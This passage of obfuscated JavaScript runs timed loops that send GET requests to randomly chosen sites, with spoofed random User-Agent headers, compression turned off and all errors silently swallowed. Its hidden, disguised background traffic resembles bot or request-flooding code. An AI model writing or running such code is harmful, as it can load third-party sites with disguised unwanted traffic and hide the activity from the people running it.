    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x5d1 * -0x5 + -0x2 * -0xf82 + -0xd7 * 0x27) * getRandomInt(0x994 * -0x2 + -0x2 * 0x614 + -0x1f51 * -0x1, 0x1 * 0x220f + -0x58e * -0x7 + -0x34 * 0x167));
}, 0x1025 + 0x1480 + -0x2441);